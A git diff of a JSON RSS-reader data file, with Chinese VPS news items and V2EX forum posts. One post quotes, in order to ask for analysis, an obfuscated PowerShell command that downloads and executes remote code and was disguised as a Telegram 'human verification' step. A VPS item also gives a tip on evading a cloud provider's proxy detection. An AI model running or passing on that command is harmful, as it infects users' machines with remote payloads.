@@ -104,6 +104,12 @@
       ]
     },
     {
+      "title": "少数派",
+      "feedUrl": "https://rsshub.app/sspai/index",
+      "siteUrl": "https://sspai.com",
+      "articles": []
+    },
+    {
       "title": "潮流周刊",
       "feedUrl": "https://weekly.tw93.fun/rss.xml",
       "siteUrl": "https://weekly.tw93.fun/",
@@ -208,6 +214,68 @@
       ]
     },
     {
+      "title": "VPS信号旗播报 - Telegram Channel",
+      "feedUrl": "https://rsshub.app/telegram/channel/vps_xhq",
+      "siteUrl": "https://t.me/s/vps_xhq",
+      "articles": [
+        {
+          "id": "https://t.me/vps_xhq/694",
+          "author": null,
+          "description": "腾讯云轻量锐驰200M版内测结束，发售在即\n该厂商自17日-19日的内测环节已然接近尾声，腾讯云200M轻量云主机正式发售在即。这是腾讯云继阿里云上月26日推出200M带宽轻量云服务器后所采取的一项重要防御措施。\n腾讯云的200M轻量售价40元起（2C-1G-40G），在高配置机型上较阿里云有一些价格优势，但是香港区域低配版缺货严重。腾讯云轻量可能开出7K83、7K62 CPU（2.6GHz/3.3GHz），也可能开出 8255C 的CPU（2.5GHz/3.1GHz），前者主频略高于后者。一些区域开启IPv6后7K62将切换至英特尔8255c，7K83不支持IPv6。\n在内测中一些人已摸索出最优购机方案，其原理是先凑单再退款，之后通过领取的大额优惠券进行续费便能享有大幅折扣。评论区将给出一些由网友发布的攻略帖子链接供参考。预计腾讯将很快正式发售200M轻量云主机。\n尽管实际输出带宽还有待商榷，但两大巨头角力打破了国内云服务器低带宽的市场格局，为国内云主机市场的发展指明了方向，对用户而言是利好消息。\n[消息等级 Level C2 · 简要]",
+          "link": "https://t.me/vps_xhq/694",
+          "publishedOn": "2025-01-19T11:07:54.000Z",
+          "wordCount": null,
+          "title": "腾讯云轻量锐驰200M版内测结束，发售在即 该厂商自17日-19日的内测环节已然接近尾声，腾讯云200M轻量云主机正式发售在即。这是腾讯云继阿里云上月26日推出200M带...",
+          "itunes": {},
+          "imageUrl": null
+        },
+        {
+          "id": "https://t.me/vps_xhq/692",
+          "author": null,
+          "description": "BuyVM 宣布已被收购，卢森堡机房将迁移至荷兰\nBuyVM 的老板在 LowEndTalk 上发帖宣布，BuyVM 已被 Cloudzy AI 收购，买主同样是一个云服务提供商，由 BuyVM 老板的朋友 Hannan Nozari 运营。他保证，除了换老板以外几乎什么都没有改变，老员工还在，他会继续参与运营，用户的IP、硬件配置、服务一如既往。除了一个问题。\nBuyVM 将在未来6个月内搬迁卢森堡机房，公告解释原因为“缺少远程协助，以及供应商相关问题不断，几乎无法在该地点开展业务。”卢森堡机房一直是BuyVM的重要部分，许多人用它来规避DMCA版权投诉。\n新地点的选址大概率是荷兰，这是另外一个对执行版权法不那么严格的国家。据了解，荷兰不要求运营商主动检测其服务中的盗版内容，只需要在接到投诉后删除即可免责。不过很难说，荷兰的法律在对待DMCA上是否同卢森堡不相上下。\n[消息等级 Level C2 · 简要]",
+          "link": "https://t.me/vps_xhq/692",
+          "publishedOn": "2025-01-08T02:30:11.000Z",
+          "wordCount": null,
+          "title": "BuyVM 宣布已被收购，卢森堡机房将迁移至荷兰 BuyVM 的老板在 LowEndTalk 上发帖宣布，BuyVM 已被 Cloudzy AI 收购，买主同样是一个云服务提供商，由 BuyVM 老板...",
+          "itunes": {},
+          "imageUrl": null
+        },
+        {
+          "id": "https://t.me/vps_xhq/691",
+          "author": null,
+          "description": "Akamai 将终止在中国的 CDN 服务\n全球最大的CDN基础设施提供商 Akamai 通过官网宣布，自 2026 年 6 月 30 日起，所有中国 CDN 服务都将停用。在此日期之后，除非激活特定合作伙伴的解决方案，否则任何剩余的内容请求都将自动从邻国提供。\nAkamai 同时宣布与腾讯云和网宿科技建立合作伙伴关系，提供专为在中国大陆提供高性能内容交付和增强安全性而设计的解决方案。Akamai 将作为经销商，客户现在可以直接从 Akamai 购买这些解决方案，确保与现有的服务无缝集成。\n[消息等级 Level C2 · 简要]",
+          "link": "https://t.me/vps_xhq/691",
+          "publishedOn": "2025-01-06T05:12:02.000Z",
+          "wordCount": null,
+          "title": "Akamai 将终止在中国的 CDN 服务 全球最大的CDN基础设施提供商 Akamai 通过官网宣布，自 2026 年 6 月 30 日起，所有中国 CDN 服务都将停用。在此日期之后，除非...",
+          "itunes": {},
+          "imageUrl": null
+        },
+        {
+          "id": "https://t.me/vps_xhq/690",
+          "author": null,
+          "description": "搬瓦工上新 POWERBOX-30-1536\n这是BOX 的最新版本，POWERBOX 较前代在内存、存储配置和流量上都有所提升。该机器配置为：1vCPU，1536MB内存，1500GB流量，30GB存储，2.5Gigabit带宽。售价为$45/y，优惠后$41.95。无需邀请码。\n该机型同样位于 DC99，默认走优化线路，三网通过电信CN2回程，但“尽力而为”，目前为止该系列保持了良好的连通率。根据测试，该机器使用Intel CPU，磁盘IO有显著提升。\nhttps://bwh81.net/aff.php?aff=47294&pid=153\n优惠码：BWHCGLUKKB （6.77%）\n搬瓦工的管理员还宣布将在DC99率先推出IPv6，之后是所有洛杉矶的VPS。\n[消息等级 Level C2 · 简要]",
+          "link": "https://t.me/vps_xhq/690",
+          "publishedOn": "2025-01-04T06:10:42.000Z",
+          "wordCount": null,
+          "title": "搬瓦工上新 POWERBOX-30-1536 这是BOX 的最新版本，POWERBOX 较前代在内存、存储配置和流量上都有所提升。该机器配置为：1vCPU，1536MB内存，1500GB流量，30GB存...",
+          "itunes": {},
+          "imageUrl": null
+        },
+        {
+          "id": "https://t.me/vps_xhq/689",
+          "author": null,
+          "description": "阿里云提供200Mbps带宽轻量云服务器\n阿里云上线了一批新的轻量云规格，和原先的小水管不同，新规格限峰值带宽为200 Mbps，价格略高于旧款。阿里云未标注流量限制。新规格在内地、香港和境外所有区域均有提供，并在阿里云国际站同步上线。\n根据网友提供的信息，阿里云客服表示新规格不限制流量，但不保证资源抢占情况。有网友还发现，新款上线后旧款24元、34元香港轻量已不再提示“当日售出量已达上限”。\n注意：尽量不要使用阿里云进行跨境代理，会有后台检测。如果你决心这样做，至少要D一下系统。\n[消息等级 Level B · #重要 ]",
+          "link": "https://t.me/vps_xhq/689",
+          "publishedOn": "2024-12-26T06:42:18.000Z",
+          "wordCount": null,
+          "title": "阿里云提供200Mbps带宽轻量云服务器 阿里云上线了一批新的轻量云规格，和原先的小水管不同，新规格限峰值带宽为200 Mbps，价格略高于旧款。阿里云未标注流量限制...",
+          "itunes": {},
+          "imageUrl": null
+        }
+      ]
+    },
+    {
       "title": "V2EX-最新主题",
       "feedUrl": "https://rsshub.app/v2ex/topics/latest",
       "siteUrl": "https://www.v2ex.com/",
@@ -218,7 +286,7 @@
           "description": "jqknono: \n本站看到有人对分享的理解是:\n你看到了某个好用的软件，分享给别人，不涉及任何的个人利益（包括无 aff ）\n对创造的理解是:\n我自己造了款软件，开源，不获利，顺手给大家用\n以我对人性的浅显理解, 天下本无事, 无利不起早.\n[创造推广] ： 自卖自夸+软文+引流+恰饭\n按这样理解, Product Hunt 得天天被拉出来批斗.\n另外开源库是否都纯免费, 是否毫无获利? 我贡献了十次有效 PR, 按工时算有几千块. 更不用说还有更多的 issues, 原本应该是测试的活, 无偿替开源库干了, 算不算开源库的获利?\n如果是分享自己的产品, 成本主要在开发, 主要从产品获利.\n不接受自推荐, 但接受个人 IP 或自来水的推荐, 那么怎么分辨是否商单, 还是不管三七二十一先@Livid 了再说?\n设身处地的想, 可能是认为纯推广的信息墙太高, 通常主要在介绍它的产品, 或者只介绍优势而不介绍劣势, 容易引人误判, 而网络服务总有替代品, 我们希望能有更全面的对比, 也就是做横评, 而不是单品测评.\n我的 saas 服务被两个用户推过, 都是真正的三者视角, 典型特征是文章里很多内容都是其它东西. 一位是做个人 IP, 每几天发一个网络产品的评测, 一篇文章发很多平台. 该用户是真金白银的买付费服务, 然后各种网络工具狂测, 我的服务在他的评测里赢了, 最后留做了日常服务. 该个人 IP 引的流(根据时间推测)下手就是年费, 非常高质量, 文章的效果比我自己推的效果好非常多, 猜测很可能是因为该文章有横评.\n我是不喜欢个人 IP 的, 尤其是发现文章看到一半要买课, 相信会有人会赞同技术产品的官文文档是最好的, 但也会有人学习技术的方式是找老师找课, 个人 IP 可能有一天也会开始卖课, 真的有很多人喜欢听课, 而不喜欢 search && sort, 不喜欢看 doc, 更不用说看 issues 了, 没有人会说这个项目很有想象力, 只要解决剩下的 2k issues 就可以开赚.\n结合个人经验, 与其区分[创造推广]和[纯分享](技术大善人)板块, 不如加个[产品横评]板块, 流量高, 可能也不会太招反感. 不知大家觉得如何?\n另外, 技术长文难写, 单品就不容易写, 横评更不容易, 费时费力还得真的动脑子, 横评标准总被各路智者挑战. 质疑\"变量控制\", 质疑\"室温变化, 网络波动\", 要补全程 4k 录像, 质疑动机, 质疑利益相关, 要自证清白, 最后的最后回到一开始所说, 空手套白狼, 庸人自扰之.",
           "link": "https://www.v2ex.com/t/1107576",
           "publishedOn": "2025-01-24T05:40:12.000Z",
-          "wordCount": 505,
+          "wordCount": 514,
           "title": "应如何定义\"分享创造\"",
           "imageUrl": null
         },
@@ -228,7 +296,7 @@
           "description": "shinonome: \n文中给了一个案例\nclass FancyLogger:\n    \"\"\"日志类：支持向文件、Redis 、ES 等服务输出日志\"\"\"\n\n    _redis_max_length = 1024\n\n    def __init__(self, output_type=OutputType.FILE):\n        self.output_type = output_type\n        ...\n\n    def log(self, message):\n        \"\"\"打印日志\"\"\"\n        if self.output_type == OutputType.FILE:\n            ...\n        elif self.output_type == OutputType.REDIS:\n            ...\n        elif self.output_type == OutputType.ES:\n            ...\n        else:\n            raise TypeError('output type invalid')\n\n    def pre_process(self, message):\n        \"\"\"预处理日志\"\"\"\n        # Redis 对日志最大长度有限制，需要进行裁剪\n        if self.output_type == OutputType.REDIS:\n            return message[:self._redis_max_length]\n\n\nFancyLogger 类在日志输出类型不同时，需要有不同的行为。因此，我们完全可以为“输出日志”行为建模一个新的类型：LogWriter ，然后把每个类型的不同逻辑封装到各自的 Writer 类中。\nclass FileWriter:\n    def write(self, message):\n        ...\n        \n\nclass RedisWriter:\n    max_length = 1024\n\n    def write(self, message):\n        message = self._pre_process(message)\n        ...\n\n    def _pre_process(self, message):\n        \"\"\"Redis 对日志最大长度有限制，需要进行裁剪\"\"\"\n        return message[:self.max_length]\n\n\nclass EsWriter:\n    def write(self, message):\n        ...\n\n基于这些不同的 Writer 类，FancyLogger 可以简化成下面这样：\nclass FancyLogger:\n    \"\"\"日志类：支持向文件、Redis 、ES 等服务输出日志\"\"\"\n\n    def __init__(self, output_writer=None):\n        self._writer = output_writer or FileWriter()\n        ...\n\n    def log(self, message):\n        self._writer.write(message)\n\n文中对这样的写法好处解释为\n代码利用多态特性，完全消除了原来的条件判断语句。另外你会发现，新代码的扩展性也远比旧代码好。\n但是在我看来, 你要传什么 output_writer 不还是要通过 if 来选择吗, 只是把一个地方的 if 换到了另外一个地方,\n扩展性 这个模块看起来确实好了, 但是总感觉和上面一样, 这里提高了, 但是其他地方就要更多 if, TVT, 面向对象还是没有入门",
           "link": "https://www.v2ex.com/t/1107575",
           "publishedOn": "2025-01-24T05:39:55.000Z",
-          "wordCount": 641,
+          "wordCount": 700,
           "title": "《 Python 工匠》中多态的使用有一些疑惑",
           "imageUrl": null
         },
@@ -248,7 +316,7 @@
           "description": "vincentWdp: \n在 v 站看到不少人用 cursor 实现了他们的各种想法, 用几天甚至半天就可以完成一个产品的初版上线. \n我自己 cursor 用下来, 也确实少了很多体力劳动, 切身感受到了生产力革新. 省下来的时间可以研究更有意思的事情上了.\n所以, 未来几年(也许三四年), 需要编程的工作会变成啥样? 靠代码完成的产品又会变成啥样?\n将来有想法而且可以实现的人越来越多, 对云计算的需求也会更大, 这方面的事情又将会是什么样的景象?",
           "link": "https://www.v2ex.com/t/1107573",
           "publishedOn": "2025-01-24T05:37:41.000Z",
-          "wordCount": 438,
+          "wordCount": 498,
           "title": "Cursor 既然如此高效, 未来会对行业有怎样的影响?",
           "imageUrl": null
         },
@@ -258,7 +326,7 @@
           "description": "Rust2015: \n问，淘宝客服，说，晚上再试试",
           "link": "https://www.v2ex.com/t/1107572",
           "publishedOn": "2025-01-24T05:37:07.000Z",
-          "wordCount": 403,
+          "wordCount": 408,
           "title": "今天，打开 cursor，崩溃了",
           "imageUrl": null
         },
@@ -278,7 +346,7 @@
           "description": "FaiChou: \nservices:\n  app:\n    build: .\n    ports:\n      - \"3210:3210\"\n    env_file:\n      - .env\n    volumes:\n      - ./prisma:/app/prisma\n      - ./logs:/app/logs\n\n项目中有这样的一个 docker-compose 文件，在 Docker 内会对这个 prisma 和 logs 进行读写。\n正常来讲不使用 root 用户 pull 下来这个项目，然后就不会遇到权限问题。\n但是如果是用 root 进行 git pull ，然后两个目录的组和用户都变成 root 了，这会导致 Docker 内读写这两个目录有权限问题。即使在 Dockerfile 内创建响应的用户和组，加上 777 权限也不行，因为它是外部的卷。无法更改权限。\n所以这种应该怎么处理？",
           "link": "https://www.v2ex.com/t/1107569",
           "publishedOn": "2025-01-24T05:22:48.000Z",
-          "wordCount": 499,
+          "wordCount": 513,
           "title": "docker 卷权限问题请教",
           "imageUrl": null
         },
@@ -298,7 +366,7 @@
           "description": "baixixi: \n如题，\n现有一个大屏，需要实时展示一些信息\n刚开始想用的是 websocket 一直给前端推送\n但是没过一会前端便卡死了\n请教一下不知是用法问题，还是方案问题",
           "link": "https://www.v2ex.com/t/1107565",
           "publishedOn": "2025-01-24T05:13:37.000Z",
-          "wordCount": 400,
+          "wordCount": 404,
           "title": "请教一个与前端实时交互的最佳方案",
           "imageUrl": null
         },
@@ -308,7 +376,7 @@
           "description": "timerring: \n大家可以尝试登出后重新登录或者注册，应该是不可用的情况：\nhttps://forum.cursor.com/t/cursor-account-portal-down-redirecting-to-broken-links/44178",
           "link": "https://www.v2ex.com/t/1107563",
           "publishedOn": "2025-01-24T05:11:18.000Z",
-          "wordCount": 436,
+          "wordCount": 438,
           "title": "cursor 已经无法注册账号！",
           "imageUrl": null
         },
@@ -318,7 +386,7 @@
           "description": "kaminono: \n建立了一个微信群『干中学搞垃圾-独立开发』\n干中学实际上说的就是先搞个垃圾出来，再逐步完善的过程。\n如果你对独立开发感兴趣，欢迎入群。\n加 wx BASE64 ZGlhbmRpYW54aXl1Xw== 暗号『干中学』\n这是我的垃圾 PawComp 宠物记录工具，正在逐步完善中。\nhttps://apps.apple.com/us/app/pawcomp/id6738306767",
           "link": "https://www.v2ex.com/t/1107562",
           "publishedOn": "2025-01-24T05:09:15.000Z",
-          "wordCount": 475,
+          "wordCount": 492,
           "title": "干中学搞垃圾-独立开发",
           "imageUrl": null
         },
@@ -328,7 +396,7 @@
           "description": "qloog: \n看到隔壁后端、前端面试题帖子了.\n我们 gopher 需要自己的 web3 题库，主要是作为一个 gopher ，做 web3 开发都需要做些什么, 越细越好.\n各种常见的不常见的面试题,大家来互相交流吧.",
           "link": "https://www.v2ex.com/t/1107560",
           "publishedOn": "2025-01-24T05:04:10.000Z",
-          "wordCount": 419,
+          "wordCount": 462,
           "title": "大佬们，一人来一道 web3 后端面试题，年后准备试试水",
           "imageUrl": null
         },
@@ -338,7 +406,7 @@
           "description": "andyiac: \n有没有 window 高手帮忙看下这个代码干了啥\npowershell -c $r='0hHducWaatGe6ZTOvw0doZ1Lt92YuYDN3Fjcy0Gb5Ujax8yL6MHc0RHa';$u=($r[-1..-($r.Length)]-join '');&($u|%{&('iwr') ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($_)))|&('iex')}); \n\n\n昨天一个 Telegram 群要验证是否是真人，提供了上面代码，让用户复制粘贴 Win+R 运行，问了下 chatgpt 提示说是执行了一段网络代码，具体是干什么不熟悉 Window 编程没能搞出来。\n有没有 Window 高手帮忙看下这代码到底是干啥了，是否有危险操作。\n不清楚风险请不要轻易在自己电脑尝试\n不清楚风险请不要轻易在自己电脑尝试\n不清楚风险请不要轻易在自己电脑尝试",
           "link": "https://www.v2ex.com/t/1107559",
           "publishedOn": "2025-01-24T04:43:52.000Z",
-          "wordCount": 493,
+          "wordCount": 502,
           "title": "Window 网络代码分析 | 请不要轻易在自己电脑尝试",
           "imageUrl": null
         },
@@ -348,7 +416,7 @@
           "description": "ming995: \n这是家庭网络拓扑图\n\n说明\n目前接入移动 2000M 光纤\n家庭网是家庭其他成员使用，加上访客网络控制\n工作网络为 OP 使用\n工作网络的路由器使用小米 AX3000 和 AX3000T 组成 mesh 网络\n家庭网络使用华为的路由器另外使用 TPLINk 组了无线桥接作为扩展的信号覆盖范围\n想让 V 的大佬们给出一些改进的建议，或者后续升级的一些方案，[抱拳.jpg]",
           "link": "https://www.v2ex.com/t/1107558",
           "publishedOn": "2025-01-24T04:38:32.000Z",
-          "wordCount": 409,
+          "wordCount": 448,
           "title": "想问一下这个家庭网络设置的合理吗",
           "imageUrl": null
         },
@@ -368,7 +436,7 @@
           "description": "nihaojob: \n这两天咱谈的客户在广东，需要去工厂了解一下实际情况，然后再进行下一步的合作，实习生没有出过远门，问我他们家人可能不同意，我需要做什么呢？ \n北漂很多年，之前也是到处出差，第一次被问到这样的问题，不知道怎么回答好，有没有有经验的老板或者 HR 能给支支招？ 从管理上我们也学习借鉴一下。\n都是男性哦，不要想歪",
           "link": "https://www.v2ex.com/t/1107555",
           "publishedOn": "2025-01-24T04:19:59.000Z",
-          "wordCount": 595,
+          "wordCount": 669,
           "title": "小创业公司，需要带实习生出差去客户那边，问我安全是否有保障 我该怎么做？",
           "imageUrl": null
         },
@@ -378,7 +446,7 @@
           "description": "ztstillwater: \n用中英词典查询“媳妇”这个单词，会出现两个条目：\n第一个：\n媳妇 xífù\nnoun\n① （儿子的妻子） daughter-in-law\n② （晚辈亲属的妻子） wife of a relative of the younger generation\n▸ 孙媳妇\ngrand-son’s wife\n▸ 侄媳妇\nnephew’s wife\n\n第二个：\n媳妇儿 xífur\nnoun dialect\n① （妻子） wife\n▸ 娶媳妇儿\ntake a wife\n▸ 她是我媳妇儿。\nShe is my wife.\n→ 小媳妇儿\n② （年轻已婚女子） young married woman\n\n话说我自己都不知道，加一个“儿”字意思就变了。",
           "link": "https://www.v2ex.com/t/1107554",
           "publishedOn": "2025-01-24T04:16:05.000Z",
-          "wordCount": 386,
+          "wordCount": 393,
           "title": "自带的词典挺有意思的",
           "imageUrl": null
         },
@@ -398,7 +466,7 @@
           "description": "lucasj: \n「用 Cursor 半小时做了个网站」这类的帖子意义已经不大了，像是一种情绪化的帖子。现在 Cursor 已经人人皆知，希望大家用平常心看待 Cursor 。\n我希望各位大佬多发点这种帖子：如何调教 Cursor ？如何用 Cursor 更快更好地做出一个网站？",
           "link": "https://www.v2ex.com/t/1107552",
           "publishedOn": "2025-01-24T03:59:07.000Z",
-          "wordCount": 454,
+          "wordCount": 464,
           "title": "Cursor：你值得更好的帖子",
           "imageUrl": null
         },
@@ -418,7 +486,7 @@
           "description": "xtx: 内饰确实一如既往的朴素，加回转向灯拨杆属于是教育用户失败了，焕新 3 疑成最大🤡。\n去试驾过新 3 ，其实屏幕换挡我都能还能适应，毕竟窄路调头这种场景还是比较少的，而且换挡一定是在低速场景下，看下屏幕也无大碍。但是方向灯按键实在是 nc 设计，有时转弯转到一半，需要补打方向灯，方向盘没回正，甚至分不清哪个是左灯哪个是右灯。\n感觉新版内饰提升还是不少的，估计还是会大卖。",
           "link": "https://www.v2ex.com/t/1107550",
           "publishedOn": "2025-01-24T03:51:55.000Z",
-          "wordCount": 533,
+          "wordCount": 572,
           "title": "焕新版 model y 内饰今天解禁了，转向灯拨杆已经确定加回来了。",
           "imageUrl": null
         },
@@ -428,7 +496,7 @@
           "description": "beyondstars: \n现状：\n就业市场环境差，自身学历也差；\n工作无挑战性也无法使能力提升，三个月足以上手，后边都是在重复这三个月的经验；\n无年终奖，没有盼头；\n只能租很远的房子，下班回到家会很累，自习效率很低；\n高消费，攒不下💰；\n一条看不到尽头的死路，就像已经死了一样，路越走越窄，变好希望越来越渺茫，等于说慢性自杀吧。\n我预测会有杠精在下边说「公司不是学校，上班不是让你来学习的」，可是人需要有能力提升的机会和环境，失业之后，还是要靠自己的本领找到工作，你什么都不会有人要你吗？另外，公司确实有一些有挑战性有提升的工作，不过那不会分配给你。\n还会有人继续抬杠「你以为你有技术就好找工作了吗」，有技术不一定代表能找到好工作，但是没技术也没人脉就只能，就百分百确定，只能做低端的工作。待遇差，提升空间低，恶性循环。\n不知道每天这样低水平的重复，开发一个又一个狗屎 demo ，一年到头来也没有年终奖，意义是什么？产品是公司的生命线，市场对于公司的产品根本不买账，全靠老板自己过往累计的人脉骗他们去买，做吃山空。\n我也不是无病呻吟，反正公司也有的人技术部门的人也是这样，你跟他说什么都不懂。\n所以我认为，程序员唯一的护城河，只能是储蓄和老家的房子？毕竟不是所有人都有好的学历和能够在工作中得到提升和成长。",
           "link": "https://www.v2ex.com/t/1107548",
           "publishedOn": "2025-01-24T03:43:57.000Z",
-          "wordCount": 608,
+          "wordCount": 635,
           "title": "希望渺茫的人生",
           "imageUrl": null
         },
@@ -448,7 +516,7 @@
           "description": "perpetually: 目前在背调中，年后才有结果。\n薪资涨幅几乎没有，杭州平跳过去深圳\n研发岗，不知道加班多不多，有没有相关人士来说说\n另外那边卷不卷，不会天天 995 吧",
           "link": "https://www.v2ex.com/t/1107545",
           "publishedOn": "2025-01-24T03:39:32.000Z",
-          "wordCount": 338,
+          "wordCount": 358,
           "title": "收到了深圳传音控股的 offer",
           "imageUrl": null
         },
@@ -458,7 +526,7 @@
           "description": "baysonfox: \n2024/11 突然发现本来正常使用的动态公网突然被收回成了大内网\n从装维处得知在 2024/11/7 被打了一个大流量，跨网，跨省的 TAG ，公网被收回，但装维表示此 TAG 已经解除。\nhttps://mao.fan/mynat 得到的结果依然是 NAT4.  \n主要用途是 NAS+PT ，不存在 PCDN 之类的用途，也并没有被要求签承诺书之类的文件\n光猫改了桥接，路由器拨号",
           "link": "https://www.v2ex.com/t/1107544",
           "publishedOn": "2025-01-24T03:38:50.000Z",
-          "wordCount": 442,
+          "wordCount": 452,
           "title": "电信 坐标 0755, 请教下 V 们有没有公网变成 NAT4+100.64 大内网的",
           "imageUrl": null
         },
@@ -518,7 +586,7 @@
           "description": "liu11onepoint: 不要在用 Cursor 制造垃圾了",
           "link": "https://www.v2ex.com/t/1107536",
           "publishedOn": "2025-01-24T03:23:19.000Z",
-          "wordCount": 832,
+          "wordCount": 883,
           "title": "不要在用 Cursor 制造垃圾了！",
           "imageUrl": null
         },
@@ -528,7 +596,7 @@
           "description": "yoyoman: \n简介\n带壳截图工具 NiceShots,是一个方便产品开发者或者产品运营人、科技媒体博主用来制作精美的产品截图、截图美化的工具。最初我也是为了方便做截图展示自己的 APP 作品才做的 NiceShosts 。\n我也一直在不断的更新迭代它！\n支持设备：iOS 、iPad 、Mac （ M 芯片）✅\n🔗 NiceShots 传送门: https://apps.apple.com/app/niceshots/id6450619697\n⭐️ 更详细的介绍请参考帖子： https://www.v2ex.com/t/973331#reply17\n☀️带壳截屏+☀️视频套壳\n之前的主要功能是处理图片，可以更加直观的看到产品在手机上呈现的样式。\n现在新版本上新了新功能，可以给手机录屏的视频增加一个手机壳。并且能够自定义尺寸：1:1 、3:4 、9:16 还有多种精美的背景图片可以选择。\n操作流程简单，只需要三步就能做出一个精美的带壳录屏视频了：\n①导入\n②调整尺寸、背景\n③保存！\n另外，新功能非会员用户也可以直接使用，无限制。\n（以下图片和视频均是使用 NiceShots 制作的）\nNiceShots 的主页面\n\nNiceShots 的视频套壳页截图\n\n用 NiceShots 的视频套壳功能制作的视频\n请移步这里预览观看： https://github.com/JimmyWeiCode/NewWord/blob/main/31_1737183152_raw.mp4\n🎁抽奖送终身会员\n按照以往惯例，每次重大更新就要送一波终身会员的抽奖，这次也不例外！\n奖品内容： [NiceShots] 终身会员大礼包\n数量：3 个 🎁 🎁 🎁\n抽奖方式： 在本贴下留言，我会在 2025 年 1 月 26 日中午随机抽取三为幸运朋友，我会给你们的留言进行回复通知。\n最后🤝\n希望我的作品能帮助到大家，如果你们喜欢的话记得在 App Store 进行五星好评！那将是对我最大的鼓励！\n🎊祝大家新年快乐🎊",
           "link": "https://www.v2ex.com/t/1107535",
           "publishedOn": "2025-01-24T03:23:07.000Z",
-          "wordCount": 678,
+          "wordCount": 837,
           "title": "更新🎉+送终身会员🎁 带壳截图工具 NiceShots 支持视频套壳啦！",
           "imageUrl": null
         },
@@ -538,7 +606,7 @@
           "description": "Brand001: 岗位名称：初级数值策划\n岗位职责：\n1 ，负责游戏的数值模型完善，负责游戏平衡性的调试，确保游戏内战斗和经济数值的平衡性、可控性。并提供详细、高度自动化的文档和模型。\n2 ，负责游戏内与数值紧密相关的系统设计，包括但不限于战斗系统、经济系统等。\n3 ，与策划部、技术部保持积极、高效的沟通，推动产品开发的效率，确保产品开发计划的精准实施与完成质量。\n4 ，针对线上运营数据，进行合理分析，提出合理改进意见并落实改进。\n任职要求： \n1 ，至少一款 RPG 或卡牌类完整项目数值策划经验。对游戏数值体验敏感，能与系统密切配合，分析并设计相关数值功能。\n2 ，具备良好的数学功底，较强的建模运算、数值推演与评估能力。\n3 ，熟练掌握各类办公软件、产品设计软件，特别是 Excel ，能使用 Excel 建立清晰、高度自动化的数值模型，熟练使用 VBA 则更优。\n4 ，具备严谨、认真、追求完美的产品制作态度，高度的工作责任感和团队合作精神，沟通能力强。\n5 ，热爱游戏，对手游市场潜力有自己的认识，具备全身心投入投入游戏制作的激情。\n\n岗位名称：初级系统策划\n岗位职责：\n1 、根据项目设计方向，协助制作人进行产品各系统的规划并完成系统功能设计；\n2 、负责游戏系统功能的设计，文档撰写，系统功能开发跟进，开发工作的协调、进度把控和结果验收；\n3 、与技术人员协调完成系统功能的开发与制作，并持续保持跟进与优化迭代；\n4 、整理系统设计思路，建立系统设计相关的流程与规范\n任职要求\n1 、1 年及以上游戏策划经验，有较强的规则和 UI 交互设计能力，独立完成过中型玩法或系统。\n2 、能独立完成任务玩法设计和实现。\n3 、有较强的语言沟通和文字表达能力，有良好的团队精神和抗压能力。\n4 、熟悉放置卡牌类产品优先\n\n岗位名称：初级战斗/关卡策划\n岗位职责：\n1. 完成功能数据结构、导表、校验流程的搭建工作，推动方案落地。\n2. 协助项目组开发游戏开发工具(如技能编辑器，可视化战斗编辑工具和各类脚本应用)，并对工具改善提出有效建议，完成工具迭代。\n3. 优化策划团队的工作流程，独立开发供策划使用的工具，并输出配套的工具使用、流程介绍文档，对策划使用过程中的问题进行解答。\n4 、能够在引擎内完成角色和怪物的 AI 编写、各种相关关卡要素的配置，跟进美术需求。\n\n任职要求：\n1. 有良好的编程能力和代码阅读能力(C#、TypeScript 等)，能够独立完成策划工具的开发。（ IO 读写、Excel 批量操作、Xml 可视化编辑等）\n2. 有 1 年以上使用 Cocos 引擎开发放置类卡牌游戏经验。\n3. 有敏锐的产品直觉，逻辑优秀，独立思考，学习能力强。\n4. 对市场有敏锐的洞察力，对目标玩家群体有深度的认知和理解。\n—————\n工作时间：上班时间可以灵活一些，早上 11：00 到下午 19：00 或者下午 18:00-凌晨 2 点\n—————\n简历发送邮箱： zygs2151@gmail.com",
           "link": "https://www.v2ex.com/t/1107534",
           "publishedOn": "2025-01-24T03:13:59.000Z",
-          "wordCount": 427,
+          "wordCount": 432,
           "title": "新增远程工作岗位：初级系统策划，初级战斗/关卡策划，初级数值策划，熟悉该领域的小伙伴过来看看",
           "imageUrl": null
         },
@@ -548,7 +616,7 @@
           "description": "tt83: \n一直挺好奇 cpu 里那么多晶体管，内存数据存在高低电压中。每天在千亿万亿次计算中有没有可能出错，例如某一个 0 被当成 1 ，只要某一个位出错可能出现连锁反应导致整个计算结果的出错，计算机有没有机制保证或者察觉到这种出错。如果存在这种可能是不是你银行的钱就可能多一个 0 或少一 0 ，这种出错概率是多少。\n这里大多数人应该都是做软件的，可能平常也不会去想这些底层硬件是如何去保证计算的正确性。",
           "link": "https://www.v2ex.com/t/1107532",
           "publishedOn": "2025-01-24T03:11:04.000Z",
-          "wordCount": 584,
+          "wordCount": 586,
           "title": "计算机是如何保证计算结果的正确性",
           "imageUrl": null
         },
@@ -558,7 +626,7 @@
           "description": "Paulownia: \n包含电器、居家软转提升幸福感的好物\n扫地机器人的话，家里没有预留自动清洗的进水口。。。\n不考虑投影仪与洗碗机。\n客厅观看电视距离大约 3 米，抽油烟机之类的考虑白色\n先鞠躬感谢。",
           "link": "https://www.v2ex.com/t/1107531",
           "publishedOn": "2025-01-24T03:10:56.000Z",
-          "wordCount": 703,
+          "wordCount": 888,
           "title": "大佬们，一人出一个居家好物，年后准备搬家",
           "imageUrl": null
         },
@@ -568,7 +636,7 @@
           "description": "CyouYamato: 涨幅还挺高的，30 天的商业版要 ¥60 了。问了原因说是风控导致的成本上升？我怎么感觉是洗钱的要收网了。",
           "link": "https://www.v2ex.com/t/1107530",
           "publishedOn": "2025-01-24T03:10:41.000Z",
-          "wordCount": 513,
+          "wordCount": 543,
           "title": "淘宝 cursor 涨价了",
           "imageUrl": null
         },
@@ -588,7 +656,7 @@
